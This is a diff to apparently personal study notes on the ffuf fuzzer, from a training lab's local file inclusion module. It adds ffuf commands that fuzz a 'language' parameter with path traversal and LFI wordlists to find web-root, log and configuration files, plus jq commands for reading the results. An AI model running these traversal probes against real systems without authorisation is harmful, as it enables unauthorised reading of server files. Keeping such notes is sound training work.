@@ -5,8 +5,17 @@
 # The main two options are:
 # -w for wordlists
 # -u for the URL
-# get rid of copyright comments with: -ic=ignore comments
-# these comments reside inside at the beginning of the wordlist file
+# -ic=ignore comments: get rid of copyright comments - these comments reside inside at the beginning of the wordlist file
+# -of specify file type
+# -o write output to file
+e.g. -of json -o z.json
+e.g. ffuf -w ./resources/LFI-WordList-Linux:FUZZ -u 'http://94.237.54.192:32075/index.php?language=../../../../FUZZ' -fs 2287 -of json -o z.json 2 > /dev/null
+# This writes output to z.json and silences stdout
+# open file 
+jq . z.json | grep FUZZ | less
+
+# or
+jq '.results[].input.FUZZ' z.json # explanation in resources/chat_jq_explain.txt
 
 ffuf -w /path/to/wordlist -u <URL> -ic
 
@@ -68,6 +77,16 @@ ffuf -w /home/user/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -
 ffuf -w /home/user/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx
 
 
+##################### Another example using the language parameter from the LFI module #############
+ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
+
+
+################################ Webroot fuzzing ############################
+ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
+
+
+################################ Servers logs/configuration fuzzing ############################
+ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
 # parameter fuzzing - POST requests: thery are not appended after the '?' symbol
 # POST requests are passed within in the data field within the HTTP request
 # -d: for the data field
